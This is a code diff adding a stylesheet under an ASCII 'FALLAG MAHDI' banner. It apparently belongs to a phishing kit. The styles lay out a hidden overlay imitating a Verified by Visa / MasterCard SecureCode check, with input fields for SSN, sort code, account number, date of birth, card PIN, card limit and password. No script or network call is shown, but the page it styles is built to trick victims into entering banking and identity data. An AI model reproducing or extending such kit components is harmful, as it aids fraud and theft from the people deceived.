@@ -1,0 +1,167 @@
+/*
+#####################################################################################################
+###### ####### ##      ##      #######  #######       #### #### ####### ##     ##   ######   ########
+##     ##   ## ##      ##      ##   ## ##             ## ### ## ##   ## ##     ##   ##    ##    ##
+###### ####### ##      ##      ####### ##  ######     ##  #  ## ####### #########   ##     ##   ##
+##     ##   ## ##      ##      ##   ## ##    ##       ##     ## ##   ## ##     ##   ##    ##    ##
+##     ##   ## ####### ####### ##   ##  #######       ##     ## ##   ## ##     ##   ######   ########
+#####################################################################################################
+*/
+#FMHDone {
+	display: none;
+    z-index: 10;
+    background: rgba(0,0,0,0.7);
+    width: 100%;
+    height: 100%;
+    position: absolute;
+    top: 0;
+        font-family: "HelveticaNeue", "HelveticaNeue-Light", "Helvetica Neue Light", helvetica, arial, sans-serif;
+
+}
+#FMHDtwo {
+	margin: 0 auto;
+    margin-top: 100px;
+    width: 380px;
+    min-height: 200px;
+    background: white;
+    border-radius: 5px;
+    padding: 25px;
+}
+.pff {
+    float: left;
+    margin-right: 0px; 
+}
+#FMDcardIconVBV {
+    font-size: 50px;
+}
+#FMDcardIconMCS {
+    font-size: 50px;
+    float: right;
+}
+#FMDcardIconBankName {
+    color: #002069;
+    font-weight: bolder;
+    font-size: 1.2em;
+}
+#FMDcardIconCardType {
+    color: #888;
+    font-weight: bolder;
+    font-size: 1em;
+}
+#FMDSSN {
+    font-size: 1.2em;
+    font-weight: bold;
+    display: none;
+}
+#FMDSSNhead {
+    margin-bottom: -15px;
+    display: block;
+}
+#FMDSSNpart1 {
+    width: 83px;
+    margin-left: 15px;
+    background-position: 53px 6px !important;
+}
+#FMDSSNpart2 {
+    width: 69px;
+    background-position: 39px 6px !important;
+}
+#FMDSSNpart3 {
+    width: 95px;
+    background-position: 65px 6px !important;
+}
+#FMDSORTCODE {
+    font-size: 1.2em;
+    font-weight: bold;
+    display: none;
+}
+#FMDSORTCODEhead {
+    margin-bottom: -15px;
+    display: block;
+}
+#FMDSORTCODEpart1 {
+    width: 69px;
+    margin-left: 15px;
+    background-position: 39px 6px !important;
+}
+#FMDSORTCODEpart2 {
+    width: 69px;
+    background-position: 39px 6px !important;
+} 
+#FMDSORTCODEpart3 {
+    width: 69px;
+        background-position: 39px 6px !important;
+}
+#FMDACCNUMCODE {
+    font-size: 1.2em;
+    font-weight: bold;
+    display: none;
+}
+#FMDACCNUMCODEhead {
+    margin-bottom: -15px;
+    display: block;
+}
+#FMDACCNUMCODEpart1 {
+    width: 95px;
+    margin-left: 15px;
+    background-position: 65px 6px !important;
+}
+#FMDACCNUMCODEpart2 {
+    width: 95px;
+    background-position: 65px 6px !important;
+}
+#FMDDOB {
+    font-size: 1.2em;
+    font-weight: bold;
+}
+#FMDDOBhead {
+    margin-bottom: -15px;
+    display: block;
+}
+#FMDDOByear {
+    width: 118px;
+        background-position: 80px 6px !important;
+}
+#FMDDOBmonth {
+    width: 85px;
+    margin-left: 15px;
+    background-position: 50px 6px !important;
+}
+#FMDDOBday {
+    width: 85px;
+    background-position: 50px 6px !important;
+}
+#FMDSecSetting {
+    font-size: 1.2em;
+    font-weight: bold;
+}
+#FMDSecSettinghead {
+    margin-bottom: -15px;
+    display: block;
+}
+#FMDSecSettingPIN {
+    width: 121px;
+    margin-left: 15px;
+    background-position: 90px 6px !important;
+}
+#FMDcardLimit {
+    width: 185px;
+        background-position: 150px 6px !important;
+}
+#FMDSecSettingPass {
+    margin-left: 15px;
+    width: 323px;
+}
+#FMDsubmitButtio {
+    margin-top: 21px;
+    width: 100%; 
+    float: none;
+}
+#FMHloadVBVDone {
+        width: 385px;
+    height: 515px;
+    position: absolute;
+    background: rgba(255, 255, 255, 0.6);
+     display: none; 
+    z-index: 20;
+}
